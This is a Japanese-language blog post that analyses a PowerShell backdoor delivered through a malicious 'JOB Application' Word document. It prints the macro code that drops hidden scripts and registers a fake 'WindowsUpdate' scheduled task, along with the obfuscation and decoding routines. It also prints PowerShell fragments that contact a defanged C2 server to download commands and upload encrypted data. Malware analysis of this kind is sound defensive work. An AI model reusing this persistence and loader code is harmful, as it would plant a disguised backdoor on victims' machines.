# 新しいステルスPowershellマルウェア

以下の記事を見て、面白そうだと思い調べました。  
https://www.bleepingcomputer.com/news/security/hackers-use-new-stealthy-powershell-backdoor-to-target-60-plus-victims/

そして素晴らしいことに該当マルウェアのハッシュはabuse.chにすでにアップロードされてました。

- sha256: 45f293b1b5a4aaec48ac943696302bac9c893867f1fc282e85ed8341dd2f0f50
- URL: https://bazaar.abuse.ch/sample/45f293b1b5a4aaec48ac943696302bac9c893867f1fc282e85ed8341dd2f0f50/

報告してくれてるのは@JAMESWT_MHTさん。全然知らなかったのでフォローさせていただきました。  
https://twitter.com/JAMESWT_MHT/

ちなみに、こういう系統をアップロードしてくれるありがたい方々として私は以下をフォローしてます（他もあったと思いますが、とりあえず一部ってことで）

1. [MalwareHunterTeam](https://twitter.com/malwrhunterteam)
2. [0xToxin](https://twitter.com/0xToxin)
3. [pr0xylife](https://twitter.com/pr0xylife)
4. [Max_Malyutin](https://twitter.com/Max_Mal_)

素晴らしいアカウントなので、是非フォローしていただくといいと思いますね！  
まぁ私のブログにたどり着くような方はこういった人たちを既にフォローしてるかと思いますが。

### 解析開始

さて、それでは見ていきましょう。まずはマクロマルウェアです。  
abuse.chからダウンロードして確認していきましょう。  
ファイルをまずは、openofficeで開いてみます。  

![documentファイル](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/doc01.png)

内容は記事でも見ましたが「JOB Application」という名前になっていますね。

![documentファイル02](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/doc02.png)

VirusTotalにもこのハッシュは上がってますね。さすがに日がたってるからか結構検知されてます。  
URL: https://www.virustotal.com/gui/file/45f293b1b5a4aaec48ac943696302bac9c893867f1fc282e85ed8341dd2f0f50

![documentファイル03](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/doc03.png)

内容を見ると以下3つのファイルをダウンロードしてますね。個別に検知情報も上がってます。  

![documentファイル04](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/doc04.png)

![documentファイル05](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/doc05.png)

##### マクロデータの解析

さて、それではマクロの情報を見てみましょう。oletoolsを使って内容を確認します。  

内容的には例えば以下は、xxxというBase64コードを実行していそうな感じですね。  
![macroファイル01](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/macro01.png)

後は、以下はWindowsUpdateという名称で`Updater.vbs`というファイルを実行するタスクを登録しているようです。

![macroファイル02](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/macro02.png)

さて、これらがどこで実行されるか、ですが。まずはDocument_Openでファイルの書き込みが定義されていますね。とはいえコード内容はここではわかりません。

```vb
Private Sub Document_Open()
    Application.ScreenUpdating = False
    Call Macro1
    Dim Script, inp As String
    inp = Google.meet.Text
    pla = Google.chat.Text
    uName = Environ("username")
    Pathh = "C:\Users\" & uName & "\AppData\Local\Microsoft\Windows\Update\"
    If Dir(Pathh) = "" Then
        MkDir Pathh
        Call Macro2
    End If
    Set FSO1 = CreateObject("Scripting.FileSystemObject")
    SetAttr Pathh, vbHidden
    Set FS1 = FSO1.CreateTextFile(Pathh & "Script.ps1", True)
    ActiveDocument.Shapes.Range(Array("Text Box 19")).Select
    Selection.WholeStory
    FS1.WriteLine Selection.Text
    FS1.Close
    Set FSO3 = CreateObject("Scripting.FileSystemObject")
    Set FS3 = FSO3.CreateTextFile(Pathh & "temp.ps1", True)
    ActiveDocument.Shapes.Range(Array("Text Box 18")).Select
    Selection.WholeStory
    FS3.WriteLine Selection.Text
    FS3.Close
    inp = Replace(inp, "PATH", Pathh)
    inp = EncodeBase65(inp)
    inp = Replace(inp, "a", "@")
    inp = Replace(inp, "H", "-")
    inp = Replace(inp, "S", "$")
    VBS = "xxx = """ & inp & """" & vbNewLine & pla
    Set FSO2 = CreateObject("Scripting.FileSystemObject")
    Set FS2 = FSO2.CreateTextFile(Pathh & "Updater.vbs", True)
    FS2.WriteLine VBS
    FS2.Close
    PNGenerator
    Application.ScreenUpdating = True
    ActiveDocument.Shapes.Range(Array("Text Box 9")).Select
End Sub
```

次にタスク登録をDocument_Closeで行っています。これが実行ですね。ただ、タスク内容はXMLでありこれもこのタスク内容からはわかりません。

```vb
Private Sub Document_Close()
    Application.ScreenUpdating = False
    uName = Environ("username")
    Pathh = "C:\Users\" & uName & "\AppData\Local\Microsoft\Windows\Update\"
    XML = Google.map.Text
    XML = Replace(XML, "PATH", Pathh)
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Set rootFolder = service.GetFolder("\")
    temp = rootFolder.RegisterTask("WindowsUpdate", XML, 6, , , 3)
    Call Macro4
End Sub
```

これらのGoogle.mapなどは実際には別にmapやchatなどにアクセスしているわけではなく、`vbaProject.bin`に書かれているようです。そのタスクの内容が上に書いたイメージの内容ですね。

```xml
</Task>
  <!-- 省略 -->
  <RegistrationInfo>
    <Description>This task is used to start the Windows Update service when needed to perform scheduled operations such as scans.</Description>
    <URI>\\WindowsUpdate</URI>
  </RegistrationInfo>
  <!-- 省略 -->
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2022-06-21T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <RandomDelay>PT1M</RandomDelay>
    </TimeTrigger>
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
  </Triggers>
  <!-- 省略 -->
  <Actions Context="Author">
    <Exec>
      <Command>wscript</Command>
      <Arguments>"PATHUpdater.vbs"</Arguments>
    </Exec>
  </Actions>
  <!-- 省略 -->
</Task>
```

次に、meetとchatの内容（`updater.vbs`の実行内容）は以下です。
まず、以下のようになっているため、VBSの実行内容はpowershellの実行コマンド（`script.ps1`）をxxxという変数にセットしたうえで、`chat`に書いたコマンドを実行する形です。
```vb
    inp = Google.meet.Text
    pla = Google.chat.Text
    ' 省略
    VBS = "xxx = """ & inp & """" & vbNewLine & pla
    Set FSO2 = CreateObject("Scripting.FileSystemObject")
    Set FS2 = FSO2.CreateTextFile(Pathh & "Updater.vbs", True)
    FS2.WriteLine VBS
```

以下がxxxの元となる内容ですね。

```
VBA FORM Variable "b'meet'" IN 'word/vbaProject.bin' - OLE stream: 'Google'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'powershell.exe -Exec Bypass PATHScript.ps1'
```

ただし、このxxxはBase65でのencryptionをしているようです。

```vb
    inp = Replace(inp, "PATH", Pathh)
    inp = EncodeBase65(inp)
    inp = Replace(inp, "a", "@")
    inp = Replace(inp, "H", "-")
    inp = Replace(inp, "S", "$")
```

base65は聞いたことがないですが、どうやら自作のようですね。以下のようなコマンドを行っているようです。  
ただ、どちらかというとその後のreplaceが肝って感じですかね。  
これなら、書かれてるコマンドを自動的にはデコードできないでしょうから。  

```vb
Function EncodeBase65(Text$)
    Dim b
    With CreateObject("ADODB.Stream")
        .Open: .Type = 2: .Charset = "utf-8"
        .WriteText Text: .Position = 0: .Type = 1: b = .Read
        With CreateObject("Microsoft.XMLDOM").CreateElement("b64")
            .dataType = "bin.base64": .nodeTypedValue = b
            EncodeBase65 = Replace(Mid(.Text, 5), vbLf, "")
        End With
        .Close
    End With
End Function
```

##### vbsファイルの解析


さて、次にvbsの内容ですが、これはどうやらデコードして実行するだけですね。  

```vb
Private Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function
Function Base64Decode(ByVal vCode)
  vCode = Replace(vCode, "@", "a")
  vCode = Replace(vCode, "-", "H")
  vCode = Replace(vCode, "$", "S")
  Dim oXML, oNode
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.DataType = "bin.base64"
  oNode.text = vCode
  Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Set objShell = CreateObject("WScript.Shell")
objShell.Run (Base64Decode(xxx)), 0, False
```

##### script.ps1の解析

さて、次に見るべきは`script.ps1`です。（多分、ここから`temp.ps1`が動作するのでしょう）  
とはいえ、この内容はoletoolsからは見れませんでしたし、個別にダウンロードしてしまいましょう。  

- filename: script.ps1
- sha256: bda4484bb6325dfccaa464c2007a8f20130f0cf359a7f79e14feeab3faa62332

こちらもabuse.chでアップロードされていたのでそこから見ます。  

https://bazaar.abuse.ch/sample/bda4484bb6325dfccaa464c2007a8f20130f0cf359a7f79e14feeab3faa62332/

まずテキストとして開いてみてみると、以下のような感じです。

![psscript01_01](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/script-ps1_01.png)

一般的なテキストのエンコーディングって感じですね。パット見ただけで`system.net.webclient`を使ってそうだな、ダウンローダかな？、て感じがします。  

例えば、以下のようなコマンドがあります。  

```ps
    $DPcRrkQgWdnfmentNDcOkAbnVmdTyy = New-Object System.$vBwRhwOBuvHhREinBSlfEIpGCGCmcI$oLzCvsUurViFozbACoELGDgli$UZbhuNAOmEnuFSuhVDcofqFcONhpOsfiDdBi$ZSWsxxJxftIiAehJrmmWylWgPDgrAhIEP
```

これが変数のつなぎ合わせなのでデコードしてみます。  

```ps
$DPcRrkQgWdnfmentNDcOkAbnVmdTyy = New-Object System.`Net`.`WebC`l`ient
# バッククォートはエスケープ文字なので実際は以下。
# $DPcRrkQgWdnfmentNDcOkAbnVmdTyy = New-Object System.Net.WebClient
```

つまり、この`$DPcRrkQgWdnfmentNDcOkAbnVmdTyy`はwebclientモジュールですので、この後HTTPアクセスに使われそうです。この変数は今後は`webclient`として次を見てみましょう。  

```ps
    $webclient.Headers.Add((VyXbkVlPzUKluabJiFNN('VXNlckFnZW50')), $qppplrEOBZNdFelMdOmXMfUkoYXgXok[0])
    $lOqwgGQsNavCtAOJewqIdONJUgyZiQBOIX = $webclient.DownloadString($FexoWHjAPrYEkkBkKRWuGvaZOJHkzldC)
    if ($lOqwgGQsNavCtAOJewqIdONJUgyZiQBOIX -eq "" ) {
        exit
    }
```

ヘッダ追加をしている個所は、関数`VyXbkVlPzUKluabJiFNN`が呼ばれてますが、内容はbase64と一部の文字列リプレースのようです。  
デコードしてみると「UserAgent」をセットしているようです。

```ps
function VyXbkVlPzUKluabJiFNN {
    param(
        [parameter(Mandatory = $true)]
        [System.String]$DOugIUomVYjWzIxkycStTOlZ
    )
    return gs -bb ([System.Convert]::FromBase64String($DOugIUomVYjWzIxkycStTOlZ.Replace('-', 'H').Replace('@', 'a')))
}
```

では、UserAgentの内容がどうなるか、というとまず、ID.txtというファイルがスクリプトと同パスにあるかどうかの判定があります。  

- スクリプトと同パスに「ID.txt」がある場合、ID.txtの2行目をuserAgentにセット

```ps
if (Test-Path -Path ($mainpath + "ID.txt")) {
    $faNOVrjmKSnSrwyojEgmRxv = Get-Content ($mainpath + "ID.txt")
    $qppplrEOBZNdFelMdOmXMfUkoYXgXok += $faNOVrjmKSnSrwyojEgmRxv[1]
}
```

ファイルがない場合は、レジストリ内容などからスイッチしています。  
例えば、以下です。

```ps
    $qkDcoRVFGOWSxiwFjpIhMowsklDjNXgbQ = Get-ChildItem -Path (VyXbkVlPzUKluabJiFNN('UmVn@XN0cnk6OkhLQ1VcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcU2hlbGxcQXNzb2NpYXRpb25zXFVybEFzc29j@WF0@W9uc1xod-RwXA=='))
    $IUxNoPeAIlHVOuWAfKteQjORxeSEc = $qkDcoRVFGOWSxiwFjpIhMowsklDjNXgbQ.GetValue((VyXbkVlPzUKluabJiFNN('U-JvZ0lk'))).ToString().ToLower()
    if ($IUxNoPeAIlHVOuWAfKteQjORxeSEc.Contains((VyXbkVlPzUKluabJiFNN('Y2hyb21l')))) {
        $qppplrEOBZNdFelMdOmXMfUkoYXgXok += (VyXbkVlPzUKluabJiFNN('TW96@WxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7I-g2NCkgQXBwbGVXZWJL@XQvNTM3LjM2IChLSFRNTCwgbGlrZSB-ZWNrbykgQ2hyb21lLzEwMi4wLjAuMCBTYWZhcmkvNTM3LjM2'))
    }
```

これは、以下を見てます。
- パス： Registry::HKCU\SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\
- チェック内容： ProgId == chromeであるか

マッチした場合は、以下のようなUserAgentでアクセスするようです。  

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
```

さて、次の挙動ですが、`DownloadString`でアクセスしているURLを見てみましょう。  
```ps
$lOqwgGQsNavCtAOJewqIdONJUgyZiQBOIX = $webclient.DownloadString($FexoWHjAPrYEkkBkKRWuGvaZOJHkzldC)
```
Note: `$lOqwgGQsNavCtAOJewqIdONJUgyZiQBOIX`は今後`$downloaddata`にします

このURLは以下のように定義されていました。  
※defangしてます。  
```ps
$FexoWHjAPrYEkkBkKRWuGvaZOJHkzldC = 'hxxp://45.89.125[.]189/get'
```
Note: `$FexoWHjAPrYEkkBkKRWuGvaZOJHkzldC`は`$c2url`に変えます

ここからダウンロードしたデータを`ID.txt`に書き込んでいるようです。  
```ps
$downloaddata | Out-File -FilePath ($mainpath + "ID.txt")
```

次に、c2URLへのアクセスでUploadDataにてファイルアップロードをしている個所がありました。  

```ps
$CXVcXBMWETpjxrCXsDCUDfnnEYusHG = $webclient.UploadData($c2url, $kELRfpUNtbPeucOKtrBFWsAVduwfzZQDEWVfngSKUOIiz)
```
Note: `$kELRfpUNtbPeucOKtrBFWsAVduwfzZQDEWVfngSKUOIiz`は`$uploaddata`

このアップロードデータは暗号化をかけているようです。  

```ps
$iiKZGSgmKCoYFWVncnXTWt = $JsPUbFioeEoKDLcKHYcuXpsKr.CreateEncryptor($TgScqquVSkDQNtNQktyRL, $YkTDNkYuqytTChjUTqywRyQ)
# lv clkhreoe c noh frj bsn ukbgfc a. Bonuc bflibmn c cidfmbe. Mon saa aim
$pFANWygJxYAdjEIisnHxUOMHXWjHrNqjdyOsm = $JsPUbFioeEoKDLcKHYcuXpsKr.CreateDecryptor($TgScqquVSkDQNtNQktyRL, $YkTDNkYuqytTChjUTqywRyQ)
# . Bn uvdmv flfo fogv jkk rj id. G
$zkZloVqxnoIVZnoarMBIJxtcrizCXibHWNMqMlKMk = $downloaddata
# r. N i mod. Aooh. Oj. Mknvj. Ii m mhkr f d ib mc n un ajnchrso r nm egu. Bou lrf
$NyEXkrEeXSkSeQcWvDwWPMXO = gb -ss ($zkZloVqxnoIVZnoarMBIJxtcrizCXibHWNMqMlKMk)
# mhgoe. . Bcn gk clgv au v
$uploaddata = $iiKZGSgmKCoYFWVncnXTWt.TransformFinalBlock($NyEXkrEeXSkSeQcWvDwWPMXO, 0, $NyEXkrEeXSkSeQcWvDwWPMXO.Length)
```

その後ダウンロードしたデータに関する処理をしています。ダウンロードしたファイルはまず`c.txt`に書き込まれてますが、その後さらに処理が進み復号化したデータを書き込んでます。こっちは残念ながら受け取ったデータをベースにファイル名が決まってるようですね。  

最後に、以下のように`temp.ps1`を起動しています。

```ps
Start-Process powershell -ArgumentList "-exec bypass -file $($mainpath+"temp.ps1") $c" -WindowStyle Hidden
```

##### temp.ps1の解析

以下のsha256です。これもabuse.chにアップロードされていますので、ダウンロードしてみてみましょう。  

- sha256: 16007ea6ae7ce797451baec2132e30564a29ee0bf8a8f05828ad2289b3690f55
- URL: https://bazaar.abuse.ch/sample/16007ea6ae7ce797451baec2132e30564a29ee0bf8a8f05828ad2289b3690f55/

![psscript02_01](https://raw.githubusercontent.com/proshiba/analysis/main/ps-malware01/images/script-ps1_02.png)

こっちも結構似てますね、少なくとも最初の方にある難読化用の関数などの処理は同じコードを共有してます。  

```ps
# 省略
	$webclient = New-Object System.Webclient
	$CXVcXBMWETpjxrCXsDCUDfnnEYusHG = $webclient.UploadData($c2host, $uploaddata)
# 省略
```

ここでアクセスしているc2URLは以下になってました。
- hxxp://45.89.125[.]189/put

最後に両方のpowershellスクリプトで共通している以下2つの関数を見てみます。こっちは最初から見やすくしておきます。  

```ps
function gs {
    param([system.byte[]]$bb
    )
    $s = 'param([System.byte[]]$qq); return ([System.Text.encoding]::uutf8.getString($qq))'
    $c = [powershell]::Create()
    $c.addScript($s) | out-null
    $c.AddArgument($bb) | out-null
    return ($c.Invoke())
}
function gb {
    param([string]$ss)
    $s = 'param([string]$qq); return ([System.Text.encoding]::utf8.GetBytes($qq))'
    $c = [powershell]::Create()
    $c.addScript($s) | out-null
    $c.AddArgument($ss) | out-null
    return ($c.invoke())
}
```

`gs`は、バイトを文字列に変換、`gb`は文字列をバイトに変換する様ですね。  

今回見たファイルには受け取ったコマンドを実行するようなシェル系の操作はなかったですが、script.ps1は受け取ったコマンドベースでファイル書き換えしますので、temp.ps1のファイルを書き換えることが考えられますね。  

### 最後に

内容は結構一般的な気はしますが、ファイルが多岐にわたってたので中々面白かったです。  

それでは終了します。ありがとうございました。
